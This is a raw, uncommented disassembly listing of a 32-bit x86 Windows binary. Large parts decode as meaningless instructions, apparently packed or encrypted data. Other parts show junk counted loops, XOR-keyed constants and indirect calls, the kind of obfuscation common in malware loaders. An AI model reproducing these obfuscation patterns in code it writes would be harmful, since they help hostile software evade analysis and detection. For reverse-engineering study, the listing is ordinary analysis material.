  4111fb:	repz sbb DWORD PTR [ecx],0xb415e258
  411202:	test   BYTE PTR [ebx],dh
  411204:	and    ch,BYTE PTR [ebx]
  411206:	popa   
  411207:	cwde   
  411208:	mov    bh,0x9b
  41120a:	mov    ch,0x42
  41120c:	(bad)  
  41120d:	pop    edx
  41120e:	pop    ebp
  41120f:	out    0xce,al
  411211:	int3   
  411212:	pop    ss
  411213:	cmp    cl,BYTE PTR [edi+0x42]
  411216:	xchg   ebx,eax
  411217:	jo     0x411296
  411219:	or     bh,ch
  41121b:	aaa    
  41121c:	add    edi,ebp
  41121e:	mov    edx,0x118e6303
  411223:	test   BYTE PTR [eax-0x1f48def4],bh
  411229:	fild   QWORD PTR [ecx+0x59]
  41122c:	xor    DWORD PTR [ebx-0x4f95321e],edi
  411232:	fdivp  st(3),st
  411234:	pop    edx
  411235:	sar    DWORD PTR [eax+0x7e],0xdd
  411239:	cmp    BYTE PTR [edi+edi*2-0x7],dh
  41123d:	popf   
  41123e:	daa    
  41123f:	loop   0x411295
  411241:	jecxz  0x4111f4
  411243:	retf   0x49bd
  411246:	pop    edx
  411247:	jmp    0x1b2:0x2688ce91
  41124e:	dec    esp
  41124f:	push   eax
  411250:	jb     0x411247
  411252:	rol    DWORD PTR [esi-0x810ce11],0x13
  411259:	repnz test eax,0x1f118f76
  41125f:	ret    
  411260:	xchg   ecx,eax
  411261:	and    eax,0x712180bb
  411266:	or     eax,edx
  411268:	push   fs
  41126a:	int3   
  41126b:	icebp  
  41126c:	xor    ebp,DWORD PTR [eax+ecx*4+0x3417f348]
  411273:	loope  0x4112b9
  411275:	clc    
  411276:	(bad)  
  411277:	push   eax
  411278:	jbe    0x411201
  41127a:	jg     0x4112da
  41127c:	mov    esp,0x3e700dd7
  411281:	mov    edi,0x1e6f37c0
  411286:	jmp    0x41122b
  411288:	(bad)  
  411289:	mov    edx,DWORD PTR [esi-0x2a]
  41128c:	fnsave [eax*2-0x289dd607]
  411293:	pop    ds
  411294:	jl     0x411240
  411296:	cld    
  411297:	pop    ebp
  411298:	rcl    ch,cl
  41129a:	je     0x411315
  41129c:	ret    
  41129d:	jnp    0x411292
  41129f:	jmp    0x4112e0
  4112a1:	icebp  
  4112a2:	sbb    eax,DWORD PTR [eax]
  4112a4:	ins    DWORD PTR es:[edi],dx
  4112a5:	pushf  
  4112a6:	xor    edi,ebp
  4112a8:	lods   al,BYTE PTR ds:[esi]
  4112a9:	lds    edx,FWORD PTR [edi*2+0x41d89309]
  4112b0:	in     al,0x6f
  4112b2:	call   0x9ec6:0x17b669eb
  4112b9:	inc    edx
  4112ba:	mov    al,0xfa
  4112bd:	adc    DWORD PTR [eax-0xbf21ed3],edx
  4112c3:	or     al,0x61
  4112c5:	fs repnz cdq 
  4112c8:	adc    ecx,ebp
  4112ca:	fistp  WORD PTR [bx+0x2dc0]
  4112cf:	pusha  
  4112d0:	add    al,0x61
  4112d2:	rcl    ebp,cl
  4112d4:	inc    eax
  4112d5:	jne    0x411286
  4112d7:	jmp    0x445e5b28
  4112dc:	cwde   
  4112dd:	xchg   edi,eax
  4112de:	les    ecx,FWORD PTR [edi]
  4112e0:	inc    ecx
  4112e1:	sub    cl,BYTE PTR [ebp+0x69]
  4112e4:	out    0xb,eax
  4112e6:	clc    
  4112e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4112e8:	jns    0x41131d
  4112ea:	lock mov eax,DWORD PTR [edx+0x194]
  4112f1:	mov    ecx,DWORD PTR [eax]
  4112f3:	mov    eax,DWORD PTR [ecx+0x3c]
  4112f6:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  4112fa:	add    eax,ecx
  4112fc:	mov    DWORD PTR [ebp+0x8],esi
  4112ff:	mov    DWORD PTR [ebp+0x10],eax
  411302:	mov    eax,DWORD PTR [ebp+0x10]
  411305:	pop    esi
  411306:	test   eax,eax
  411308:	je     0x41132c
  41130e:	push   DWORD PTR ds:0x414bd6
  411314:	push   DWORD PTR ds:0x414982
  41131a:	mov    eax,DWORD PTR [edx+0x194]
  411320:	push   DWORD PTR [eax]
  411322:	mov    eax,DWORD PTR [ebp+0x10]
  411325:	call   eax
  411327:	jmp    0x41132f
  41132c:	mov    eax,DWORD PTR [ebp+0x10]
  41132f:	leave  
  411330:	ret    0xc
  411333:	push   ebp
  411334:	mov    ebp,esp
  411336:	sub    esp,0x30
  411339:	mov    DWORD PTR [ebp-0x4],0xf89c8536
  411340:	mov    ecx,DWORD PTR ds:0x434603
  411346:	xor    DWORD PTR ds:0x4345cf,ecx
  41134c:	mov    DWORD PTR [ebp-0x18],0xf89c8539
  411353:	mov    DWORD PTR ds:0x4344ff,0x14
  41135d:	cmp    DWORD PTR ds:0x4344ff,0x0
  411364:	je     0x4113b9
  41136a:	cmp    DWORD PTR ds:0x4344ff,0x3
  411371:	jne    0x411387
  411377:	push   0x43477a
  41137c:	push   0x400000
  411381:	call   DWORD PTR ds:0x4130d8
  411387:	cmp    DWORD PTR ds:0x4344ff,0x4
  41138e:	jne    0x41139f
  411394:	mov    eax,ds:0x4344ff
  411399:	dec    eax
  41139a:	mov    ds:0x4344ff,eax
  41139f:	mov    eax,ds:0x4344ff
  4113a4:	dec    eax
  4113a5:	mov    ds:0x4344ff,eax
  4113aa:	jmp    0x41135d
  4113af:	adc    DWORD PTR ds:0x4344ef,0x46ae
  4113b9:	mov    ecx,DWORD PTR [ebp-0x4]
  4113bc:	and    DWORD PTR ds:0x434543,0x0
  4113c6:	jmp    0x4113d6
  4113cb:	mov    eax,ds:0x434543
  4113d0:	inc    eax
  4113d1:	mov    ds:0x434543,eax
  4113d6:	cmp    DWORD PTR ds:0x434543,0x18
  4113dd:	jae    0x411423
  4113e3:	cmp    DWORD PTR ds:0x434543,0xf
  4113ea:	jne    0x411406
  4113f0:	push   0x43457f
  4113f5:	push   0x4743
  4113fa:	push   DWORD PTR [ebp-0x1c]
  4113fd:	push   DWORD PTR [ebp-0x10]
  411400:	call   DWORD PTR ds:0x4132ac
  411406:	cmp    DWORD PTR ds:0x434543,0xe
  41140d:	jne    0x41141e
  411413:	mov    eax,ds:0x434543
  411418:	inc    eax
  411419:	mov    ds:0x434543,eax
  41141e:	jmp    0x4113cb
  411423:	push   ebx
  411424:	mov    eax,0x7510851
  411429:	xor    ecx,eax
  41142b:	and    DWORD PTR ds:0x43460f,0x0
  411435:	mov    ebx,DWORD PTR ds:0x43460f
  41143b:	inc    ebx
  41143c:	mov    DWORD PTR ds:0x43460f,ebx
  411442:	cmp    DWORD PTR ds:0x43460f,0x6
  411449:	jne    0x411462
  41144f:	push   DWORD PTR [ebp-0x10]
  411452:	push   0x434593
  411457:	push   0x4346db
  41145c:	call   DWORD PTR ds:0x413360
  411462:	cmp    DWORD PTR ds:0x43460f,0x5
  411469:	jne    0x41147c
  41146f:	mov    ebx,DWORD PTR ds:0x43460f
  411475:	inc    ebx
  411476:	mov    DWORD PTR ds:0x43460f,ebx
  41147c:	cmp    DWORD PTR ds:0x43460f,0x10
  411483:	jb     0x411435
  411489:	movzx  ebx,WORD PTR ds:0x4344df
  411490:	adc    DWORD PTR ds:0x4345c7,ebx
  411496:	mov    ebx,0x327299
  41149b:	xor    DWORD PTR ds:0x434583,0x577
  4114a5:	add    ecx,ebx
  4114a7:	or     DWORD PTR ds:0x434603,0x4344e7
  4114b1:	mov    DWORD PTR [ebp-0x1c],ecx
  4114b4:	sbb    DWORD PTR ds:0x4345d3,edi
  4114ba:	mov    ecx,DWORD PTR [ebp+0x14]
  4114bd:	xor    DWORD PTR ds:0x4345f7,0x4344f3
  4114c7:	push   esi
  4114c8:	mov    DWORD PTR ds:0x4345cb,0x24af
  4114d2:	push   edi
  4114d3:	sbb    DWORD PTR ds:0x4344ff,0x43453f
  4114dd:	test   ecx,ecx
  4114df:	je     0x41155f
  4114e5:	mov    ecx,DWORD PTR [ebp+0x14]
  4114e8:	sbb    DWORD PTR ds:0x434613,edx
  4114ee:	mov    ecx,DWORD PTR [ecx]
  4114f0:	and    DWORD PTR ds:0x4344ff,0x0
  4114fa:	xor    edi,edi
  4114fc:	or     edi,DWORD PTR ds:0x4344ff
  411502:	inc    edi
  411503:	mov    DWORD PTR ds:0x4344ff,edi
  411509:	cmp    DWORD PTR ds:0x4344ff,0xb
  411510:	jne    0x411529
  411516:	push   0x434607
  41151b:	push   DWORD PTR [ebp-0x28]
  41151e:	push   0x707e
  411523:	call   DWORD PTR ds:0x4132b0
  411529:	cmp    DWORD PTR ds:0x4344ff,0xa
  411530:	jne    0x411545
  411536:	xor    edi,edi
  411538:	add    edi,DWORD PTR ds:0x4344ff
  41153e:	inc    edi
  41153f:	mov    DWORD PTR ds:0x4344ff,edi
  411545:	cmp    DWORD PTR ds:0x4344ff,0x14
  41154c:	jb     0x4114fa
  411552:	mov    DWORD PTR ds:0x4344e7,0x18c9
  41155c:	mov    DWORD PTR [ebp-0x1c],ecx
  41155f:	mov    DWORD PTR ds:0x4344f7,0x1a
  411569:	cmp    DWORD PTR ds:0x4344f7,0x0
  411570:	je     0x4115ca
  411576:	cmp    DWORD PTR ds:0x4344f7,0xb
  41157d:	jne    0x411592
  411583:	push   DWORD PTR [ebp-0x14]
  411586:	push   DWORD PTR [ebp-0x14]
  411589:	push   DWORD PTR [ebp-0x14]
  41158c:	call   DWORD PTR ds:0x4130dc
  411592:	cmp    DWORD PTR ds:0x4344f7,0xc
  411599:	jne    0x4115ac
  41159f:	mov    edi,DWORD PTR ds:0x4344f7
  4115a5:	dec    edi
  4115a6:	mov    DWORD PTR ds:0x4344f7,edi
  4115ac:	mov    edi,DWORD PTR ds:0x4344f7
  4115b2:	dec    edi
  4115b3:	mov    DWORD PTR ds:0x4344f7,edi
  4115b9:	jmp    0x411569
  4115be:	mov    ecx,DWORD PTR ds:0x4344eb
  4115c4:	adc    DWORD PTR ds:0x4344e3,ecx
  4115ca:	imul   edx,eax
  4115cd:	mov    ecx,0x4573
  4115d2:	mov    DWORD PTR ds:0x43460b,0x1d
  4115dc:	cmp    DWORD PTR ds:0x43460b,0x0
  4115e3:	je     0x41162d
  4115e9:	cmp    DWORD PTR ds:0x43460b,0xc
  4115f0:	jne    0x4115ff
  4115f6:	push   DWORD PTR [ebp-0x1c]
  4115f9:	call   DWORD PTR ds:0x4130e0
  4115ff:	cmp    DWORD PTR ds:0x43460b,0xd
  411606:	jne    0x41161b
  41160c:	xor    edi,edi
  41160e:	xor    edi,DWORD PTR ds:0x43460b
  411614:	dec    edi
  411615:	mov    DWORD PTR ds:0x43460b,edi
  41161b:	mov    edi,DWORD PTR ds:0x43460b
  411621:	dec    edi
  411622:	mov    DWORD PTR ds:0x43460b,edi
  411628:	jmp    0x4115dc
  41162d:	add    edx,ecx
  41162f:	jmp    0x41182f
  411634:	rol    DWORD PTR [edi+0x7d4a654a],cl
  41163a:	std    
  41163b:	mov    cl,0xe9
  41163d:	xchg   ebp,eax
  41163e:	inc    edx
  41163f:	jg     0x4115ef
  411641:	xlat   BYTE PTR ds:[ebx]
  411642:	mov    bl,0xa8
  411644:	(bad)  
  411648:	pop    ecx
  411649:	jg     0x4116c9
  41164b:	jle    0x4116b2
  41164d:	sbb    al,0x38
  41164f:	cwde   
  411650:	addr16 stc 
  411652:	test   DWORD PTR [edi+0x6033aeb5],ebp
  411658:	ins    DWORD PTR es:[di],dx
  41165a:	(bad)  
  41165b:	fistp  QWORD PTR [ebx]
  41165d:	loope  0x411670
  41165f:	inc    edx
  411660:	push   eax
  411661:	fnstcw WORD PTR [ebx]
  411663:	aaa    
  411664:	fdiv   QWORD PTR [esi+0x2e]
  411667:	xor    eax,DWORD PTR [edi-0x67034715]
  41166d:	mov    eax,ds:0x84bd6582
  411672:	jecxz  0x411633
  411674:	inc    ebp
  411675:	clc    
  411676:	mov    al,0x75
  411678:	clc    
  411679:	push   esi
  41167a:	fs stos BYTE PTR es:[edi],al
  41167c:	pop    es
  41167d:	hlt    
  41167e:	mov    edi,0xcdcdb3a3
  411683:	push   edi
  411684:	push   0x43588c8a
  411689:	mov    BYTE PTR [ebx-0x4a],0x63
  41168d:	jp     0x41163b
  41168f:	outs   dx,DWORD PTR ds:[esi]
  411690:	pop    esi
  411691:	aad    0xdf
  411693:	xor    al,0x5c
  411695:	xor    BYTE PTR [esi+0x3228a930],0xc3
  41169c:	pop    ecx
  41169d:	daa    
  41169e:	les    esp,FWORD PTR ds:0xac185812
  4116a4:	dec    si
  4116a6:	jnp    0x41165d
  4116a8:	or     al,0x2c
  4116aa:	imul   ebx,DWORD PTR [bx+si-0x78],0xffffffd2
  4116af:	inc    edi
  4116b0:	cmp    eax,0xfefcebd5
  4116b5:	or     sp,dx
  4116b8:	adc    DWORD PTR [ebx-0x1c],esp
  4116bb:	add    DWORD PTR [ebx],ebx
  4116bd:	rol    DWORD PTR [edx+0x15],0xf5
  4116c1:	mov    bl,0x29
  4116c3:	ret    
  4116c4:	ins    DWORD PTR es:[edi],dx
  4116c5:	repnz sbb al,0x53
  4116c8:	lds    eax,FWORD PTR [edi-0x5dbe2412]
  4116ce:	(bad)  
  4116cf:	cld    
  4116d0:	(bad)  
  4116d2:	cmp    eax,0x3affa06f
  4116d7:	(bad)  
  4116d8:	jns    0x4116b4
  4116da:	out    dx,eax
  4116db:	sbb    eax,0x5636604e
  4116e0:	shl    DWORD PTR [esi+0x7b],1
  4116e3:	jnp    0x4116bb
  4116e5:	ss and eax,0x2404dc5c
  4116eb:	jl     0x411747
  4116ed:	pusha  
  4116ee:	cmp    eax,0xa3d6b5a8
  4116f3:	push   ss
  4116f4:	call   0x9a0c:0x847c5f68
  4116fb:	ins    DWORD PTR es:[edi],dx
  4116fc:	xor    eax,0x67a39f7c
  411701:	dec    eax
  411702:	pop    edi
  411703:	arpl   WORD PTR [eax],sp
  411705:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411706:	mov    ah,0xb2
  411708:	jmp    0xf89b7c67
  41170d:	sbb    eax,edx
  41170f:	sub    edx,DWORD PTR [edi-0x1338ba1e]
  411715:	xor    cl,ch
  411717:	daa    
  411718:	imul   edi,DWORD PTR [edx+edi*2],0xffffffb3
  41171c:	lahf   
  41171d:	in     al,0x90
  41171f:	and    al,0xc5
  411721:	mov    bh,0x51
  411723:	retf   
  411724:	fisttp DWORD PTR [ecx]
  411726:	ror    DWORD PTR [eax],cl
  411728:	xchg   edx,eax
  411729:	dec    esi
  41172a:	ret    
  41172b:	call   0x7ba7ba81
  411730:	and    eax,0x86a15188
  411735:	icebp  
  411736:	sti    
  411737:	in     al,0x71
  411739:	dec    edi
  41173a:	and    eax,0x7f79ace7
  41173f:	fild   WORD PTR [edx+0x28]
  411742:	jmp    0x10fbf17c
  411747:	(bad)  
  411748:	(bad)  
  411749:	jnp    0x4116e4
  41174b:	stc    
  41174c:	jl     0x41176a
  41174e:	int3   
  41174f:	dec    ecx
  411750:	repz or bl,bl
  411753:	mov    ?,WORD PTR [eax+edi*4+0x79978f5f]
  41175a:	sub    eax,0x7d40d316
  41175f:	pop    edi
  411760:	sub    eax,0xf7944289
  411765:	push   0xffffff91
  411767:	aas    
  411768:	jne    0x4116ea
  41176a:	sti    
  41176b:	xchg   edi,eax
  41176c:	jl     0x4117c9
  41176e:	popa   
  41176f:	push   esi
  411770:	shl    ch,1
  411772:	cmp    al,0x79
  411774:	aaa    
  411775:	pop    ebx
  411776:	add    al,0xbc
  411778:	adc    BYTE PTR [ecx-0x5e],0xd4
  41177c:	and    ecx,DWORD PTR [edi-0x5]
  41177f:	and    eax,0xb370a4d
  411784:	inc    esp
  411785:	lods   al,BYTE PTR ds:[esi]
  411786:	mov    ah,0xdc
  411788:	and    eax,0x19553986
  41178d:	(bad)  
  41178e:	ss mov bl,0x71
  411791:	test   al,0xa5
  411793:	push   es
  411794:	push   0xeb99c832
  411799:	xor    BYTE PTR [eax],ah
  41179b:	xor    ecx,DWORD PTR [ecx+0x58ab780e]
  4117a1:	lea    eax,[ebx-0x53]
  4117a4:	inc    esi
  4117a5:	xchg   DWORD PTR [edi],ebp
  4117a7:	pop    ecx
  4117a8:	popa   
  4117a9:	hlt    
  4117aa:	lds    ecx,FWORD PTR [edi]
  4117ac:	add    eax,0x6fa9a497
  4117b1:	inc    BYTE PTR [edx]
  4117b3:	sub    BYTE PTR [ecx-0xb1d993c],ch
  4117b9:	(bad)  
  4117ba:	data16 jns 0x4117c4
  4117bd:	or     al,0x9e
  4117bf:	cmp    ch,BYTE PTR [edi-0x1c2baa7c]
  4117c5:	ins    BYTE PTR es:[edi],dx
  4117c6:	jmp    0x4117ba
  4117c8:	stos   DWORD PTR es:[edi],eax
  4117c9:	outs   dx,DWORD PTR ds:[esi]
  4117ca:	adc    BYTE PTR [ecx],0x75
  4117cd:	fistp  WORD PTR ds:0x9706da46
  4117d3:	jae    0x41181a
  4117d5:	test   BYTE PTR [esi+0x24],ch
  4117d8:	ins    DWORD PTR es:[edi],dx
  4117d9:	push   ecx
  4117da:	sub    al,0x35
  4117dc:	sub    BYTE PTR [edx-0x583a512b],dh
  4117e2:	sub    al,0x82
  4117e4:	clc    
  4117e5:	(bad)  
  4117e6:	popf   
  4117e7:	aam    0x8
  4117e9:	sbb    DWORD PTR [edx+0x3],esi
  4117ec:	fdivr  QWORD PTR [eax+0x1643a583]
  4117f2:	das    
  4117f3:	cwde   
  4117f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4117f5:	test   DWORD PTR [eax-0x5a],ebx
  4117f8:	ror    DWORD PTR [eax+0x61e76a11],0x24
  4117ff:	scas   eax,DWORD PTR es:[edi]
  411800:	cli    
  411801:	test   DWORD PTR [esi+0x11],0x57dd9bfc
  411808:	cli    
  411809:	inc    edx
  41180a:	mov    eax,ds
  41180c:	nop
  41180d:	std    
  41180e:	pop    edi
  41180f:	adc    DWORD PTR [edx-0x6e],ebp
  411812:	cdq    
  411813:	lock push ecx
  411815:	inc    esp
  411816:	sbb    ebx,ebx
  411818:	dec    ecx
  411819:	js     0x41179e
  41181b:	inc    BYTE PTR [edi-0x3e]
  41181e:	lock xor eax,0x565671b0
  411824:	ins    BYTE PTR es:[edi],dx
  411825:	jge    0x41185c
  411827:	retf   0xe725
  41182a:	mov    bh,0x45
  41182c:	(bad)  
  41182d:	mov    eax,ds:0x7879be8f
  411832:	add    BYTE PTR [eax],al
  411834:	or     edi,0x33cc
  41183a:	mov    edi,0x1556
  41183f:	jmp    0x411a3f
  411844:	retf   0x898a
  411847:	outs   dx,DWORD PTR ds:[esi]
  411848:	dec    ecx
  411849:	jne    0x41183f
  41184b:	stos   DWORD PTR es:[edi],eax
  41184c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41184d:	loope  0x411863
  41184f:	lods   al,BYTE PTR ds:[esi]
  411850:	std    
  411851:	pop    ds
  411852:	push   edi
  411853:	mov    dl,ch
  411855:	push   esp
  411856:	jle    0x4118d6
  411858:	pop    ecx
  411859:	jg     0x4118d9
  41185b:	jle    0x411871
  41185d:	inc    edi
  41185e:	int    0x6c
  411860:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411861:	cld    
  411862:	jns    0x411891
  411864:	cmp    BYTE PTR [ecx],bh
  411866:	or     BYTE PTR [eax-0x1c157d7f],cl
  41186c:	bound  ecx,QWORD PTR [ebx+0x5e]
  41186f:	out    0xb,eax
  411871:	retf   0xbc28
  411874:	jne    0x41182b
  411876:	push   0xffffff89
  411878:	lahf   
  411879:	pop    ds
  41187a:	sub    eax,0xa9e3607f
  41187f:	cmc    
  411880:	shl    BYTE PTR [ebp-0x1b],cl
  411883:	xor    dl,BYTE PTR es:[edi]
  411886:	shr    DWORD PTR [ebp+0xb],1
  411889:	adc    al,BYTE PTR [ecx+0x4a0aed9e]
  41188f:	or     DWORD PTR [eax+0x2d1fdb3e],ebx
  411895:	sub    eax,0xc175f405
  41189a:	mov    ebp,0x2cd98ca3
  41189f:	sbb    eax,DWORD PTR [ebx]
  4118a1:	pop    ss
  4118a2:	test   eax,0x77ff0491
  4118a7:	cmc    
  4118a8:	out    0x67,al
  4118aa:	addr16 pop ebp
  4118ac:	xor    al,0xaf
  4118ae:	push   0x18
  4118b0:	mov    dh,0xbb
  4118b2:	iret   
  4118b3:	shl    DWORD PTR [edi-0x1e],0x5f
  4118b7:	adc    eax,0xeb5c282e
  4118bc:	out    dx,eax
  4118bd:	mov    ah,0xf8
  4118bf:	dec    eax
  4118c0:	xor    bl,dh
  4118c2:	ret    
  4118c3:	sbb    al,BYTE PTR [ebx+0x45]
  4118c6:	mov    ah,0x2a
  4118c8:	je     0x41185f
  4118ca:	dec    esp
  4118cb:	mov    esp,0x3ba3f1c6
  4118d0:	or     esi,DWORD PTR [edx-0x34d81da7]
  4118d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4118d7:	fdivr  DWORD PTR [ebx+0x72]
  4118da:	loop   0x411886
  4118dc:	cwde   
  4118dd:	rol    bl,0x53
  4118e0:	pop    ebx
  4118e1:	cmp    al,0xd2
  4118e3:	js     0x41186b
  4118e5:	ss xchg ebx,eax
  4118e7:	pusha  
  4118e8:	in     eax,dx
  4118e9:	fucomp st(0)
  4118eb:	fild   WORD PTR [edi]
  4118ed:	xchg   esp,eax
  4118ee:	leave  
  4118ef:	adc    eax,0x69e26b9d
  4118f4:	pop    ecx
  4118f5:	cmp    DWORD PTR [edx+0x74a9a3eb],esi
  4118fb:	scas   al,BYTE PTR es:[edi]
  4118fc:	test   al,0x1b
  4118fe:	fadd   st(5),st
  411900:	sub    eax,0xb6f38e02
  411905:	or     eax,0x4cc738e5
  41190a:	mov    edx,0x5d64f9a6
  41190f:	sub    al,0x4e
  411911:	clts   
  411913:	mov    cl,0x14
  411916:	loope  0x4118ab
  411918:	out    dx,al
  411919:	je     0x4118e3
  41191b:	loope  0x411955
  41191d:	pop    eax
  41191e:	push   ss
  41191f:	jle    0x41194f
  411921:	pop    ss
  411922:	mov    BYTE PTR [ebx-0x57c393c2],ah
  411928:	mov    bl,0x2e
  41192a:	ins    BYTE PTR es:[edi],dx
  41192b:	pop    edx
  41192c:	or     bl,BYTE PTR [edx+0x1a1fb38e]
  411932:	call   0x4f91:0xfe13ac67
  411939:	icebp  
  41193a:	paddusw mm7,QWORD PTR [edi-0x1e]
  41193e:	cmp    ecx,DWORD PTR [eax-0x1d3bcbab]
  411944:	jmp    0xd5a3:0xade2c5c0
  41194b:	jbe    0x411916
  41194d:	test   al,0xaf
  41194f:	adc    BYTE PTR [ecx+0x67b22c8d],0xde
  411956:	outs   dx,DWORD PTR ds:[esi]
  411957:	inc    ecx
  411958:	jmp    0x411988
  41195a:	fbstp  TBYTE PTR [ebp+0x2d]
  41195d:	outs   dx,DWORD PTR ds:[esi]
  41195e:	das    
  41195f:	mov    esi,0x125b0656
  411964:	mov    BYTE PTR [edx-0x68],bl
  411967:	(bad)  
  411969:	pop    ecx
  41196a:	xor    BYTE PTR [ecx+ebx*8-0x634e1493],cl
  411971:	add    dl,BYTE PTR [ebp+edi*2+0x35]
  411975:	jmp    0x41199c
  411977:	not    dh
  411979:	or     BYTE PTR [ebp+0x23184dd5],0xd3
  411980:	lods   al,BYTE PTR ds:[esi]
  411981:	(bad)  
  411982:	xchg   edi,eax
  411983:	xchg   ebp,eax
  411984:	xor    eax,0xd5c30855
  411989:	xor    bh,BYTE PTR [edx-0xaa4eccc]
  41198f:	push   ebp
  411990:	and    BYTE PTR [esi+0x3c0de63a],cl
  411996:	sbb    al,0x49
  411998:	jle    0x411a02
  41199a:	pop    ss
  41199b:	or     bl,cl
  41199d:	jmp    0x4119ab
  41199f:	mov    ah,BYTE PTR [esp+edi*2]
  4119a2:	xchg   edi,eax
  4119a3:	mov    edi,esi
  4119a5:	sub    DWORD PTR [esi-0x37ed204b],ebp
  4119ab:	sub    ch,BYTE PTR [ecx+0x38]
  4119ae:	enter  0x7fd3,0x91
  4119b2:	xor    eax,0x7aae795f
  4119b7:	xchg   esp,eax
  4119b8:	cmp    DWORD PTR [ecx],0x1cf5420b
  4119be:	dec    ebx
  4119bf:	inc    ecx
  4119c0:	pop    ebx
  4119c1:	jbe    0x411973
  4119c3:	outs   dx,DWORD PTR ds:[esi]
  4119c4:	cmp    DWORD PTR [esp-0x2bfcc59e],0xbc417f6
  4119cf:	pop    edx
  4119d0:	outs   dx,BYTE PTR ds:[esi]
  4119d1:	lods   eax,DWORD PTR ds:[esi]
  4119d2:	iret   
  4119d3:	and    al,0x85
  4119d5:	pop    ebp
  4119d6:	xchg   DWORD PTR [esi],ebp
  4119d8:	jl     0x4119ee
  4119da:	icebp  
  4119db:	sub    BYTE PTR [edi],bh
  4119dd:	sar    BYTE PTR [esi+0x4c7b524f],1
  4119e3:	sbb    eax,0x927f9532
  4119e8:	mov    edi,0x86aabc44
  4119ed:	sbb    eax,0x9e6dffef
  4119f2:	outs   dx,DWORD PTR ds:[esi]
  4119f3:	paddq  mm1,QWORD PTR [edx-0x1e]
  4119f7:	and    dl,dl
  4119f9:	xor    BYTE PTR [ebx],0xd3
  4119fc:	das    
  4119fd:	sbb    esi,DWORD PTR [esi-0x5deaf9a]
  411a03:	ror    DWORD PTR gs:[eax],cl
  411a06:	push   ebp
  411a07:	je     0x411a65
  411a09:	repz lea edx,[eax]
  411a0c:	arpl   WORD PTR [ebp+0x1c3c0c3b],bp
  411a12:	test   eax,0x815c7af8
  411a17:	and    eax,0x178f5c20
  411a1c:	sub    eax,0x4d45062e
  411a21:	lods   al,BYTE PTR ds:[esi]
  411a22:	mov    bl,0xe
  411a24:	scas   al,BYTE PTR es:[edi]
  411a25:	push   ss
  411a26:	fistp  WORD PTR [esi*1-0x605d2e7f]
  411a2d:	ret    0x717a
  411a30:	jno    0x411a39
  411a32:	push   esi
  411a33:	icebp  
  411a34:	mov    DWORD PTR [eax-0x8],ecx
  411a37:	cmp    eax,0x80ada95
  411a3c:	sub    esp,DWORD PTR [esi+0x4]
  411a3f:	xchg   esi,ecx
  411a41:	sub    edx,edi
  411a43:	xor    ecx,DWORD PTR ds:0x434577
  411a49:	xor    esi,esi
  411a4b:	adc    DWORD PTR ds:0x4344f7,edi
  411a51:	mov    DWORD PTR [ebp-0x28],esi
  411a54:	mov    DWORD PTR [ebp-0x2c],esi
  411a57:	dec    DWORD PTR ds:0x4345cf
  411a5d:	mov    DWORD PTR [ebp-0x14],esi
  411a60:	mov    DWORD PTR [ebp-0x8],esi
  411a63:	mov    ecx,DWORD PTR [ebp-0x18]
  411a66:	add    DWORD PTR ds:0x4345cf,0x3520
  411a70:	xor    ecx,eax
  411a72:	xor    edi,edi
  411a74:	add    ecx,ebx
  411a76:	mov    DWORD PTR [ebp-0x20],ecx
  411a79:	mov    DWORD PTR ds:0x434537,ebx
  411a7f:	mov    eax,DWORD PTR [ebp-0x20]
  411a82:	mov    DWORD PTR ds:0x4344ff,0x2abf
  411a8c:	je     0x4122b7
  411a92:	adc    DWORD PTR ds:0x4344eb,0x60fd
  411a9c:	mov    eax,DWORD PTR [ebp-0x4]
  411a9f:	adc    DWORD PTR ds:0x434553,0x6e6
  411aa9:	xor    eax,0x7510851
  411aae:	or     DWORD PTR ds:0x4345c3,0x43457b
  411ab8:	add    eax,ebx
  411aba:	mov    DWORD PTR ds:0x434613,0x35f1
  411ac4:	cmp    edi,eax
  411ac6:	jne    0x411c5a
  411acc:	sbb    DWORD PTR ds:0x4344f3,0x4344e7
  411ad6:	push   DWORD PTR [ebp+0x8]
  411ad9:	or     DWORD PTR ds:0x43460f,0x4345cb
  411ae3:	call   0x4104be
  411ae8:	and    ecx,DWORD PTR ds:0x43454f
  411aee:	mov    DWORD PTR [ebp-0x20],eax
  411af1:	mov    eax,DWORD PTR [ebp-0x4]
  411af4:	mov    ecx,DWORD PTR [ebp-0x20]
  411af7:	and    DWORD PTR ds:0x4345b7,0x0
  411b01:	mov    esi,DWORD PTR ds:0x4345b7
  411b07:	inc    esi
  411b08:	mov    DWORD PTR ds:0x4345b7,esi
  411b0e:	cmp    DWORD PTR ds:0x4345b7,0x1e
  411b15:	jne    0x411b26
  411b1b:	push   0x1cd9
  411b20:	call   DWORD PTR ds:0x4132b4
  411b26:	cmp    DWORD PTR ds:0x4345b7,0x18
  411b2d:	jb     0x411b01
  411b33:	mov    esi,0x7510851
  411b38:	xor    eax,esi
  411b3a:	add    eax,ebx
  411b3c:	cmp    ecx,eax
  411b3e:	je     0x411e9b
  411b44:	or     DWORD PTR ds:0x4345b7,0x434577
  411b4e:	push   DWORD PTR [ebp-0x20]
  411b51:	push   DWORD PTR [ebp+0x8]
  411b54:	sub    DWORD PTR ds:0x434537,0x4344e7
  411b5e:	call   0x404d31
  411b63:	movzx  ecx,WORD PTR ds:0x4345b7
  411b6a:	and    ecx,DWORD PTR ds:0x43458b
  411b70:	mov    DWORD PTR ds:0x4345b7,ecx
  411b76:	mov    DWORD PTR [ebp-0x14],eax
  411b79:	mov    DWORD PTR ds:0x43460f,0x13
  411b83:	cmp    DWORD PTR ds:0x43460f,0x0
  411b8a:	je     0x411bc6
  411b90:	cmp    DWORD PTR ds:0x43460f,0x22
  411b97:	jne    0x411bad
  411b9d:	push   0x434710
  411ba2:	push   0x4346b5
  411ba7:	call   DWORD PTR ds:0x4130e4
  411bad:	xor    eax,eax
  411baf:	or     eax,DWORD PTR ds:0x43460f
  411bb5:	dec    eax
  411bb6:	mov    ds:0x43460f,eax
  411bbb:	jmp    0x411b83
  411bc0:	add    DWORD PTR ds:0x4344eb,edx
  411bc6:	mov    eax,DWORD PTR [ebp-0x4]
  411bc9:	mov    DWORD PTR ds:0x4345cb,0x10
  411bd3:	cmp    DWORD PTR ds:0x4345cb,0x0
